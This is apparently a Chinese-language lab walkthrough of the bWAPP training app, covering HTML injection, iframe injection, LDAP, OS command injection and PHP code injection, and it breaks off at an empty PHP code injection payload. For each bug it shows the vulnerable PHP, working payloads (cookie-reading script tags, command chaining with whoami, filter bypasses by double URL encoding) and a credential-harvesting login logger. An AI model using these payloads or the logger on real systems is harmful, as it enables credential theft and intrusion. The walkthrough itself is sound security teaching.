<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = fopen(<span class="string">"loginfile.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">$login = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$pass = $_POST[<span class="string">'password'</span>];</span><br><span class="line">fwrite($data, <span class="string">"Username: $login"</span>);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fwrite($data, <span class="string">"Password: $pass"</span>);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fclose($data);</span><br><span class="line"><span class="comment">//重定向 URL</span></span><br><span class="line">Header(<span class="string">"location: http://192.168.233.133/bWAPP/htmli_get.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_2.png" alt></p>
<h2 id="防护方式"><a href="#防护方式" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $input = str_replace(<span class="string">"&lt;"</span>, <span class="string">"&amp;lt;"</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">"&gt;"</span>, <span class="string">"&amp;gt;"</span>, $input);</span><br><span class="line"></span><br><span class="line">    $input = urldecode($input);</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;</code> 和 <code>&gt;</code> 替换为 HTML 实体，然后进行 URL 解码</p>
<p>绕过：</p>
<p>直接将传入的参数进行 URL 编码即可。如果是在对话框中输入，只需要一次 URL Encode，如果是在 URL 栏中输入需要两次。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// htmlentities - converts all applicable characters to HTML entities</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> htmlentities($data, ENT_QUOTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将所有字符替换为 HTML 实体，当需要将一个字符串输出到 Web 网页时，又不确定其中是否存在 XSS 字符时，可以使用 <strong>htmlentities</strong> 函数进行输出过滤。暂时无法绕过。</p>
<h1 id="HTML-Injection-Reflected-POST"><a href="#HTML-Injection-Reflected-POST" class="headerlink" title="HTML Injection - Reflected (POST)"></a>HTML Injection - Reflected (POST)</h1><h2 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"firstname"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"lastname"</span>]))</span><br><span class="line">  &#123;   </span><br><span class="line">      $firstname = $_POST[<span class="string">"firstname"</span>];</span><br><span class="line">      $lastname = $_POST[<span class="string">"lastname"</span>];    </span><br><span class="line">      <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;font color=\"red\"&gt;Please enter both fields...&lt;/font&gt;"</span>   </span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>            </span><br><span class="line">      &#123; </span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Welcome "</span> . htmli($firstname) . <span class="string">" "</span> . htmli($lastname);   </span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以 POST 方式提交数据，和 GET 型类似，只是提交数据的方式不同</p>
<h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload (post) : </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firstname=<span class="number">1</span>&amp;lastname=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>获取登陆用户的 cookie</p>
<h2 id="防护方式-1"><a href="#防护方式-1" class="headerlink" title="防护方式"></a>防护方式</h2><p>与 GET 的防护相同，绕过方法也类似，第一种绕过需要对提交的数据 URL Encode 两次，第二种无法绕过</p>
<h1 id="HTML-Injection-Reflected-Current-URL"><a href="#HTML-Injection-Reflected-Current-URL" class="headerlink" title="HTML Injection - Reflected (Current URL)"></a>HTML Injection - Reflected (Current URL)</h1><h2 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $url = <span class="string">"http://"</span> . $_SERVER[<span class="string">"HTTP_HOST"</span>] . $_SERVER[<span class="string">"REQUEST_URI"</span>]; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p align=\"left\"&gt;Your current URL: &lt;i&gt;"</span> . $url . <span class="string">"&lt;/i&gt;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出当前请求的 URL，同样，未对输入进行过滤。</p>
<h2 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h2><p>页面直接返回所请求的 URL，直接修改所请求的 URL。但是浏览器会自动进行 URL 编码，所以需要在 burp 中去掉 URL 编码</p>
<p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="防护方式-2"><a href="#防护方式-2" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url = <span class="string">"&lt;script&gt;document.write(document.URL)&lt;/script&gt;"</span>;</span><br></pre></td></tr></table></figure>

<p>直接使用 JS 的函数输出 URL，暂时无法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">  &#125;</span><br><span class="line">  $url = <span class="string">"http://"</span>.$_SERVER[<span class="string">"HTTP_HOST"</span>].check($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 进行转义，无法绕过</p>
<h1 id="HTML-Injection-Stored-Blog"><a href="#HTML-Injection-Stored-Blog" class="headerlink" title="HTML Injection - Stored (Blog)"></a>HTML Injection - Stored (Blog)</h1><h2 id="产生原因-3"><a href="#产生原因-3" class="headerlink" title="产生原因"></a>产生原因</h2><p>存储型 XSS，恶意脚本被存储到客户端或者服务器的数据库中，当其他用户浏览网页时，就在受害者主机上执行恶意代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"entry_add"</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">      $entry = htmli($_POST[<span class="string">"entry"</span>]);</span><br><span class="line">      $owner = $_SESSION[<span class="string">"login"</span>];</span><br><span class="line">      <span class="keyword">if</span>($entry == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          $message =  <span class="string">"&lt;font color=\"red\"&gt;Please enter some text...&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>            </span><br><span class="line">      &#123; </span><br><span class="line">          $sql = <span class="string">"INSERT INTO blog (date, entry, owner) VALUES (now(),'"</span>.$entry.<span class="string">"','"</span>.$owner.<span class="string">"')"</span>;</span><br><span class="line">          $recordset = $link-&gt;query($sql);</span><br><span class="line">          <span class="keyword">if</span>(!$recordset)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="keyword">die</span>(<span class="string">"Error: "</span> . $link-&gt;error . <span class="string">"&lt;br /&gt;&lt;br /&gt;"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// Debugging</span></span><br><span class="line">          <span class="comment">// echo $sql;</span></span><br><span class="line">          $message = <span class="string">"&lt;font color=\"green\"&gt;Your entry was added to our blog!&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里没有对输入的 entry 进行过滤，如果输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ，那么这段代码就会保存在数据库，用户每次访问时都会弹窗。</p>
<h2 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h2><p>最典型的例子就是 XSS 蠕虫。</p>
<p>payload : </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//实现网页的无限刷新</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//弹出 1，注意不是 '1'</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"alert('1');"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">//生成一个按钮，点击弹出 1</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"click me"</span> <span class="attr">onclick</span>=<span class="string">"alert('1')"</span>; /&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="防护方式-3"><a href="#防护方式-3" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 addslashes 函数转义，这个函数对 <strong>单引号( ‘ )，双引号( “ )，反斜杠( \ )，NULL</strong> 生效</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// htmlentities - converts all applicable characters to HTML entities</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> htmlentities($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 进行转义，无法绕过</p>
<h1 id="iFrame-Injection"><a href="#iFrame-Injection" class="headerlink" title="iFrame Injection"></a>iFrame Injection</h1><h2 id="产生原因-4"><a href="#产生原因-4" class="headerlink" title="产生原因"></a>产生原因</h2><p>iframe 标签是 HTML 中一个很重要的标签，常用于嵌入第三方网页，比如嵌入广告页面，第三方 Web 游戏与应用等。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;?php</span><br><span class="line">  function xss($data)&#123;</span><br><span class="line">	  return $data;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe frameborder=&quot;0&quot; src=&quot;&lt;?php echo xss($_GET[&quot;ParamUrl&quot;])?&gt;&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>传入参数 ParamUrl，ParamHeight，ParamWidth，用于控制 iframe 组件，但是没有对传入的参数进行过滤</p>
<h2 id="利用方式-4"><a href="#利用方式-4" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//闭合 iframe 之后再写入注入脚本</span></span><br><span class="line">?ParamUrl=robots.txt&amp;ParamWidth=<span class="number">250</span>&amp;ParamHeight=<span class="number">250</span><span class="string">"&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_3.png" alt></p>
<h2 id="防护方式-4"><a href="#防护方式-4" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 进行转义，无法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.</span></span><br><span class="line">    <span class="comment">// These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).</span></span><br><span class="line">    <span class="comment">// Do NOT use this for XSS or HTML validations!!!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 addslashes 函数防护，payload 和未防护时相同，可以触发 xss。为什么这个防护是无效的？</p>
<p>本地复现一下，两个文件，iframexss.php 和 xss.txt，xss.txt 中内容随意。</p>
<p>iframexss.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// xss 过滤</span><br><span class="line">function xss($data)&#123;</span><br><span class="line">	return addslashes($data);</span><br><span class="line">&#125;</span><br><span class="line">// 输出传入参数</span><br><span class="line">echo $_SERVER[&quot;QUERY_STRING&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt; iframe xss&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt; xss &lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is an iframe xss !&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&quot;ParamHeight&quot;]) &amp;&amp; isset($_GET[&quot;ParamWidth&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe frameborder=&quot;0&quot; src=&quot;xss.txt&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_4.png" alt></p>
<h1 id="LDAP-Injection-Search"><a href="#LDAP-Injection-Search" class="headerlink" title="LDAP Injection (Search)"></a>LDAP Injection (Search)</h1><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>LDAP 是轻量级目录访问协议。</p>
<p>目录服务是一种特殊的数据库，专门用于保存某些属性的详细信息，比如，电话簿，地址簿，人员组织管理等等。</p>
<p>而 LDAP 类似于目录服务，只不过存储的是文件目录，存储位置为各大厂商，比如 SUN，IBM，Microsoft等等。LDAP 本身并不是目录数据库。它是一种提供访问目录数据库方法的服务和协议。</p>
<p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。LDAP不仅可以从目录数据库查询对象，还可以用于管理和身份验证。</p>
<p>一些参数如图：</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_5.png" alt></p>
<p>如果把 LDAP 和 数据库类比起来，数据库是以 表-字段-值 的形式来存储数据，而 LDAP 目录是以树的形式存储数据。dn 和库名对应，dc 和表名对应，ou 和字段对应，cn 是要查询的目标名称</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_6.png" alt></p>
<h2 id="产生原因-5"><a href="#产生原因-5" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-5"><a href="#利用方式-5" class="headerlink" title="利用方式"></a>利用方式</h2><p>This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree.The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</p>
<p>CVE-2018-12689</p>
<p>CVE-2018-5730</p>
<p>CVE-2016-8750</p>
<p>CVE-2011-4069</p>
<h2 id="防护方式-5"><a href="#防护方式-5" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="Mail-Header-Injection-SMTP"><a href="#Mail-Header-Injection-SMTP" class="headerlink" title="Mail Header Injection (SMTP)"></a>Mail Header Injection (SMTP)</h1><p><a href="https://www.freebuf.com/articles/web/14918.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/14918.html</a></p>
<p><a href="https://www.acunetix.com/blog/articles/email-header-injection/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/email-header-injection/</a></p>
<h1 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h1><h2 id="产生原因-6"><a href="#产生原因-6" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">commandi</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"target"</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">      $target = $_POST[<span class="string">"target"</span>];</span><br><span class="line">      <span class="keyword">if</span>($target == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;font color=\"red\"&gt;Enter a domain name...&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;p align=\"left\"&gt;"</span>.shell_exec(<span class="string">"nslookup  "</span>.commandi($target)).<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入一个域名，返回它的 DNS 信息，这里没有对输入进行过滤，可以实现任意命令执行。</p>
<p>这里是通过 shell_exec 函数执行系统命令，类似的函数还有 system，exec</p>
<h2 id="利用方式-6"><a href="#利用方式-6" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ; 结尾，执行完前面的命令再执行 whoami</span></span><br><span class="line">www.baidu.com ; whoami</span><br><span class="line"><span class="comment">// | 不执行前面的，只执行 whoami</span></span><br><span class="line">www.baidu.com | whoami</span><br><span class="line"><span class="comment">// &amp;&amp; 先执行前面的，再执行 whoami</span></span><br><span class="line">www.baidu.com &amp;&amp; whoami</span><br><span class="line"><span class="comment">// &amp; 先执行 whoami 再执行前面的</span></span><br><span class="line">www.baidu.com &amp; whoami</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-6"><a href="#防护方式-6" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">commandi</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $input = str_replace(<span class="string">"&amp;"</span>, <span class="string">""</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">";"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只过滤了 <code>&amp;</code> 和 <code>;</code> ，仍然可以使用 <code>|</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">commandi_check_2</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> escapeshellcmd($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>escapeshellcmd 对 shell 元字符转义</p>
<p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 &#39; 和 “ 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
<h1 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h1><h2 id="产生原因-7"><a href="#产生原因-7" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_REQUEST[&quot;message&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">?&gt;</span><br><span class="line">  &lt;p&gt;&lt;i&gt;&lt;?php @eval (&quot;echo &quot;.$_REQUEST[&quot;message&quot;].&quot;;&quot;);?&gt;&lt;/i&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>eval 函数执行 message 传入的参数，且没有过滤参数</p>
<p>如果输入 phpinfo() ，输出代码就变为 <code>&lt;?php @eval(&quot;echo phpinfo();&quot;) ?&gt;</code>，这样就实现了任意代码执行，类似的函数还有 assert 函数</p>
<h2 id="利用方式-7"><a href="#利用方式-7" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
